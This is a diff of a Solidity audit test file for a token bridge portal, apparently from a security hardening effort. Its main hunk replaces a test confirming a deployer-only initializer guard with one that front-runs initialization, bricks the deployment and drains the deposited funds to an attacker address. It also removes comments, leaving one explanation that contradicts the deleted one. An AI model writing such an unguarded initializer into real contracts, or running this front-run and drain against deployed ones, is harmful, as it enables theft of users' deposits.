@@ -296,37 +296,36 @@ contract BlackhatAuditTest is Test {
     // ─────────────────────────── [F-A] portal init front-run ───────────────────────────
 
     /// The deploy conductor sends `deploy portal` and `initialize portal` as TWO separate txs.
-    /// Pre-fix, an attacker front-running the initialize bricked the deployment — and a poisoned
-    /// address that got published would have been a full drain (fake registry → attacker outbox).
-    /// The deployer-only initializer guard must reject the front-run while the honest initialize
-    /// still succeeds. (The drain chain itself is unreachable post-guard; kept documented in
-    /// implementations-plan/bridge-hardening/audit-blackhat.md.)
-    function test_FA_portalInitFrontRun_reverts() public {
+    /// An attacker front-running the initialize bricks the deployment — and if the poisoned
+    /// address were ever published, the fake-rollup outbox gives a FULL DRAIN of every deposit.
+    function test_FA_portalInitFrontRun_bricksAndDrains() public {
         MintableERC20 realUsdc = new MintableERC20("Circle USDC", "USDC", 6, 1_000_000_000);
         NuloTokenPortal portal = new NuloTokenPortal();
 
-        // 1. Attacker front-runs the FIRST initialize with their own registry → rejected.
+        // 1. Attacker front-runs the FIRST initialize with their own registry.
         FakeRegistry evilReg = new FakeRegistry();
         vm.prank(address(0xBAD));
-        vm.expectRevert(NuloTokenPortal.NotInitializer.selector);
         portal.initialize(address(evilReg), address(realUsdc), bytes32(uint256(0xAAAA)));
-        assertEq(address(portal.registry()), address(0), "front-run must not bind a registry");
 
-        // 2. The honest initializer (the deploying EOA == this test contract) succeeds.
+        // 2. Honest initialize now reverts forever → deployment bricked.
         FakeRegistry honestReg = new FakeRegistry();
+        vm.expectRevert(NuloTokenPortal.AlreadyInitialized.selector);
         portal.initialize(address(honestReg), address(realUsdc), bytes32(uint256(0xBBBB)));
-        assertEq(address(portal.registry()), address(honestReg), "honest init binds the registry");
 
-        // 3. Post-init, deposits flow to the honest binding and re-init stays impossible.
+        // 3. WORST CASE: the poisoned address got published before anyone noticed.
         realUsdc.mint(address(0xBEEF), 1000e6);
         vm.startPrank(address(0xBEEF));
         realUsdc.approve(address(portal), 1000e6);
         portal.depositToAztecPublic(RECIPIENT, 1000e6, SECRET);
         vm.stopPrank();
-        assertEq(realUsdc.balanceOf(address(portal)), 1000e6, "victim funds held by the honest portal");
-        vm.prank(address(0xBAD));
-        vm.expectRevert(NuloTokenPortal.NotInitializer.selector);
-        portal.initialize(address(evilReg), address(realUsdc), bytes32(uint256(0xCCCC)));
+        assertEq(realUsdc.balanceOf(address(portal)), 1000e6, "victim funds held by poisoned portal");
+
+        // 4. Attacker drains via their fake outbox.
+        address attacker = address(0xBAD);
+        vm.prank(attacker);
+        portal.withdraw(attacker, 1000e6, false, Epoch.wrap(0), 0, 0, new bytes32[](0));
+        assertEq(realUsdc.balanceOf(attacker), 1000e6, "attacker drained the poisoned portal");
+        assertEq(realUsdc.balanceOf(address(portal)), 0, "portal emptied");
     }
 
     // ─────────────────────── [F-B] donation-grief neutrality ───────────────────────
@@ -415,11 +414,6 @@ contract BlackhatAuditTest is Test {
             isPrivate: false
         });
 
-        // Pinned to the actual failure rather than a bare expectRevert, which cannot tell
-        // "failed closed on the haircut" from "reverted for some unrelated reason". The haircut
-        // means the router never receives the full pull, so the portal-deposit leg runs out of
-        // allowance — an allowance failure, not the arithmetic underflow it looks like from the
-        // outside. Selector only: the reported addresses and amounts are incidental.
         // The haircut is taken twice — once pulling to the router, once paying the swap target —
         // so the router is short of the amount the deposit leg then tries to move, and the token's
         // balance subtraction underflows. Pinned rather than left as a bare expectRevert, which
@@ -433,8 +427,7 @@ contract BlackhatAuditTest is Test {
     /// Named for what it can actually prove. `RecordingPermit2` records the witness it is handed
     /// and never verifies a signature against it, so nothing here demonstrates a pre-migration
     /// signature being REJECTED afterwards — only that `swapTarget` is one of the hashed witness
-    /// fields, so rotating it changes what a user would have to sign. Rejection of a stale
-    /// signature is Permit2's own domain, covered by the real-fork suite.
+    /// fields, so rotating it changes what a user would have to sign.
     function test_FF_migrationChangesSignedWitness() public {
         router.bridgeWithFuel(_fuelParams(false), _permit(1));
         bytes32 witnessBefore = permit2.lastWitness();
